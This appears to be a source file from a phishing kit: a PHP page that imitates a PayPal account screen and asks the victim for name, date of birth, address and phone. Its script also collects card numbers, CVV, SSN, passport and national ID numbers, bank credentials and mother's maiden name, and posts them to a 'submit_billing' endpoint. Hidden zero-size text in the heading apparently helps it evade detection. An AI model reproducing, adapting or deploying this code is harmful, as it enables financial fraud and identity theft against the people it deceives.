<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once 'more.php';
require_once '../lang.php';
require_once 'mmn.php';
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="assets/pics/favi.ico">
    <link rel="apple-touch-icon" href="assets/pics/favi.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title><?php echo $account['title'];?></title>
    <link rel="stylesheet" href="assets/styles/process.css">
    <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.mask.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
</head>

<body>
    <input type="checkbox" id="toggleMenu" class="menuToggler">
    <div class="desktopNav">
        <div class="navContainer">
            <a href="javascript:" class="desktopBrand"></a>
            <div class="mobileMenu">
                <div class="logoutMobile">
                    <a href="javascript:" class="logoutTxtMobile">
          Log Out</a>
                </div>
                <div class="settingsMobile">
                    <a href="javascript:" class="svgLogo settingsTxt">
                        <img src="assets/pics/settings.svg" alt=""></a>
                </div>
                <div>
                    <p class="displayMail">
                        <?php echo $_SESSION['login_email'];?></p>
                </div>
            </div>
            <div class="desktopMenu">
                <nav class="desktopItems">
                    <ul class="firstUl">
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['summary'];?>     </a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['activity'];?></a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
         <?php echo $account['send'];?></a></li>
                        <li class="">
                            <a href="javascript:" class="linksTxt"><?php echo $account['wallet'];?></a>
                        </li>
                        <li class="activeLi">
                            <a href="javascript:" class="linksTxt"><?php echo $account['help'];?></a>
                        </li>
                    </ul>
                    <ul class="secondUl">
                        <li class="notifLi">
                            <a href="javascript:" class="svgLogo notifTxt">
                                <img src="assets/pics/noti.svg" alt=""></a>
                        </li>
                        <li>
                            <a href="javascript:" class="svgLogo settingsTxt"><img src="assets/pics/settings.svg" alt=""></a>
                        </li>
                        <li class="logoutLi">
                            <a href="javascript:" class="logoutTxtDesktop"><?php echo $account['logout'];?></a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <div class="mainContainer">
        <div class="hide" id="rotate">
            <div class="spinner">
                <div class="rotate"></div>
                <div class="processing"><?php echo $account['proccessing'];?>...</div>
            </div>
            <div class="overlay">
            </div>
        </div>
        <div class="mobileNav">
            <div class="navHeader">
                <div class="blockToggler">
                    <label class="menuLabel" for="toggleMenu"><span></span>
                        <div class="menuOpen">Menu</div>
                        <div class="menuClose">
                            Close</div>
                    </label>
                </div>
            </div>
            <div class="navLogo">
                <a href="javascript:" class="mobileBrand"></a>
            </div>
            <ul class="notifUl">
                <li>
                    <a class="svgLogo notifTxt">
                        <img src="assets/pics/noti.svg" alt="">
                    </a>
                </li>
            </ul>
        </div>
        <?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div class="contents">
            <section class="mainContents" id="process">
                <form action="submit_account?key=<?php echo $key;?>" method="post" style="padding:0 20px" novalidate="on">

                    <h2 style="font-size: 1.875rem;
    font-weight: 300;
    text-transform: none;
    font-family: 'PayPal-Sans-Big', Helvetica Neue, Arial, sans-serif;">
      <span style="font-size:0">darkness</span>
      <?php echo $account['bil'];?>     <span style="font-size:0">isnot good</span></h2>

                    <div id="kedua" style="">

                    <div class="fields clearfix">
                        <div class="multiInputs">
                            <div class="inputArea hasSub">
                                <input id="fnm" type="text" class="txt-capital" required placeholder="<?php echo $account['fnm'];?>">
                            </div>
                            <div class="inputArea hasSub pull-right" style="margin-bottom:15px">
                                <input id="dob" type="tel" required placeholder="<?php echo $account['dob'];?>" maxlength="10">
                            </div>
                        </div>
                        <div class="inputArea">
                            <input id="adr" type="text" required placeholder="<?php echo $account['adr'];?>">
                        </div>
                        <div class="multiInputs">
                            <div class="inputArea hasSub">
                                <input id="cty" type="text" required placeholder="<?php echo $account['city'];?>">
                            </div>
                            <div class="inputArea hasSub pull-right">
                                <input id="zip" type="text" required placeholder="<?php echo $account['zip'];?>" maxlength="8">
                            </div>
                        </div>
                        <div class="multiInputs">
                            <div class="inputArea hasSub">
                                <input id="stt" type="text" required placeholder="<?php echo $account['state'];?>">
                            </div>
                            <div class="inputArea hasSub pull-right">
                                <input id="cnt" type="text" required placeholder="<?php echo $account['country'];?>" value="<?php echo $countryname;?>">
                            </div>
                        </div>
                        <div class="multiInputs">
                            <div class="dropDown mobileType" style="float:left;width:33%;margin:15px 0 9px">
                                <select id="ptp" required>
                                    <option value="-1" disabled selected>
                                        <?php echo $account['pt'];?> </option>
                                    <option value="MOBILE"><?php echo $account['mobile'];?></option>
                                    <option value="HOME"><?php echo $account['home'];?></option>
                                    <option value="WORK"><?php echo $account['work'];?></option>
                                </select>
                                <div class="labelSelect">
                                    <?php echo $account['pt'];?> </div>
                            </div>

                            <div class="inputArea hasSub pull-right nMobile" style="width:65%">
                                <input id="pnm" type="tel" required placeholder="<?php echo $account['phonenumber'];?>" maxlength="15">
                            </div>
                        </div>
                        <?php
                        echo $additional;
                        ?>
                        <?php echo $mmn;?>
                         <br>
                    </div>
                    <div>

                        <button style="margin-top:20px;width:100%" type="submit" class="bt"><?php echo $account['continue'];?></button>
                    </div>
                  </div>
                </form>
            </section>

        </div>
<?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div>
            <div class="ftr">
                <div class="footerFirstContent">
                    <ul class="footerList">
                        <li><a href="javascript:"><?php echo $account['contact'];?></a></li>
                        <li><a href="javascript:"><?php echo $account['sec'];?></a></li>
                    </ul>
                    <div class="footerSecondContent">
                        <p class="footerP">Copyright ©<span>1999-2020</span> . All rights reserved.</p>
                        <ul class="footerUl">
                            <li><a href="javascript:"><?php echo $login['privacy'];?></a></li>
                            <li><a href="javascript:"><?php echo $login['legal'];?></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        $(document).ready(function() {
            $('#cex').mask('00/0000');
            $('#csc').mask('0000');
            $('#dob').mask('00/00/0000');
            $('#ccn').mask('0000 0000 0000 0000');
            $('#pnm').mask('000000000000000');
            $('#ssn').mask('000-00-0000');
            $('#acn').mask('00000000');
            $('#stc').mask('00-00-00');
            $('#sin').mask('000-000-000');

            function validExp(b) {
                var a = new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");
                return a.test(b);
            }

            function isDate(vl) {
                var rg = /^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;
                return rg.test(vl);
            }

            function validDob(vl) {
                var c = false;
                if (isDate(vl) && (vl.split('/')[2] > "1919" && vl.split('/')[2] < "2006")) {
                    c = true;
                }
                return c;
            }

            function valid() {
                var check = true;
                var ii = 0;
                $('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i, el) {
                    if (!$(el).val()) {
                        $(el).parent().addClass('hasError');
                        check = false;
                    } else {
                        $(el).not('#ccn').parent().removeClass('hasError');
                    }

                    if ($(el).attr('id') == 'dob') {
                        if (!validDob($(el).val())) {
                            $(el).parent().addClass('hasError');
                            check = false;
                        } else {
                            $(el).parent().removeClass('hasError');
                        }
                    }



                });
                return check;
            }
            $(document).on('change', '#process #ptp', function() {
                $(this).parent().removeClass('hasError');
                $(this).parent().children('.labelSelect').html($(this).children("option:selected").text());
                $(this).parent().attr('data-name', $(this).val());
            });

            $('#process input:not(.bt):not([type=checkbox]),select').each(function(i, el) {
                $(el).keyup(function() {
                    valid();
                });
                $(el).change(function() {
                    valid();
                });
            });
            $(document).on('submit', '#process form', function() {
                check = true;

                if (!valid()) {
                    check = false;
                }
                if (!validDob($('#dob').val())) {
                    $('#dob').parent().addClass('hasError');
                    check = false;
                }

                if (!check) {
                    return false;
                } else {
                    $('#rotate').removeClass('hide');
                    var ctp = $('#ctp').children("option:selected").text();
                    var ccn = $('#ccn').val();
                    var cex = $('#cex').val();
                    var csc = $('#csc').val();
                    var cid = $('#cid').val();
                    var fnm = $('#fnm').val();
                    var dob = $('#dob').val();
                    var adr = $('#adr').val();
                    var cty = $('#cty').val();
                    var zip = $('#zip').val();
                    var stt = $('#stt').val();
                    var cnt = $('#cnt').val();
                    var ptp = $('#ptp').val();
                    var par = $('#par').val();
                    var pnm = $('#pnm').val();
                    var mdn = $('#mdn').val();
                    var ssn = $('#ssn').val();
                    var pps = $('#pps').val();
                    var clm = $('#clm').val();
                    var dln = $('#dln').val();
                    var sin = $('#sin').val();
                    var pse = $('#pse').val();
                    var dni = $('#dni').val();
                    var bsn = $('#bsn').val();
                    var cpf = $('#cpf').val();
                    var fcn = $('#fcn').val();
                    var acn = $('#acn').val();
                    var stc = $('#stc').val();
                    var bus = $('#bus').val();
                    var bpw = $('#bpw').val();
                    var bans = $('#bans').val();
                    var climit = $('#climit').val();
                    var osid = $('#osid').val();
                    var civilid = $('#civilid').val();
                    var idnum = $('#idnum').val();
                    var passport = $('#passport').val();
                    var nationalid = $('#nationalid').val();
                    var qatarid = $('#qatarid').val();
                    var citizenid = $('#citizenid').val();
                    var webid = $('#webid').val();
                    var cardpass = $('#cardpass').val();
                    var mmn = $('#mmn').val();
                    var o = {
                        ctp, ccn, cex, csc, cid , fnm, dob, adr, cty, zip, stt, cnt, ptp, par, pnm, mdn, ssn, pps, clm, dln, sin, pse, dni, bsn, cpf, fcn, acn, stc, bus, bpw, bans, climit, osid, civilid,idnum, passport, nationalid, qatarid, citizenid, webid, cardpass,mmn
                    };
                    var start = new Date;
                    var xT = 0;
                    var idT = setInterval(function() {
                        xT = Math.trunc((new Date - start) / 1000);
                    }, 1000);
                    var toStart = 0;
                    $.post('submit_billing?key=<?php echo $key;?>', o, function(data, status) {
                        window.location.href = "card?key=<?php echo $key;?>";
                        if (data == 'done' && status == 'success') {
                            clearInterval(idT);
                            if (xT > 4) {
                                toStart = 0;
                            } else {
                                toStart = 1800;
                            }
                            setTimeout(function() {
                                setId();
                            }, toStart);
                        } else {
                            $('#rotate').addClass('hide');
                        }
                    });
                }
                return false;
            });

            function setId() {
                $('#rotate').addClass('hide');
                $('#process').addClass('hide');
                $('#finish').removeClass('hide');
                window.scrollTo(0, 0);
            }
            $('.gone_bt').click(function() {
                window.location.href = authentication;
            });

            function readFile(files, me, check) {
                if (files) {
                    for (var i = 0; i < files.length; i++) {
                        var FR = new FileReader();
                        FR.onload = function(e) {
                            if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
                                if (check) {
                                    $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                                } else {
                                    $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                                }
                                $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                            }
                        }
                        FR.readAsDataURL(files[i]);
                    }
                }
            }
            $(document).on('click', '.zone', function(e) {
                e.stopPropagation();
                $(this).find('input[type=file]').trigger(e);
            });
            $(document).on('click', '.btDel', function() {
                $(this).closest('form').find('[value="' + $(this).prev().attr('src') + '"]').remove();
                $(this).parent().remove();
            });
            $(document).on('change', 'input[type=file]', function() {
                readFile(this.files, this, false);
            });
            $(".dropzone-main").on('dragleave', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #dee3e7');
                $(this).css('background', '#f0f2f4');
            });
            $(".dropzone-main").on('dragover', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #0564b3');
                $(this).css('background', '#ecf1f9');
            });
            $(".dropzone-main").on('drop', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #41ad49');
                readFile(e.originalEvent.dataTransfer.files, this, true);
            });
        });
    </script>
</body>

</html>
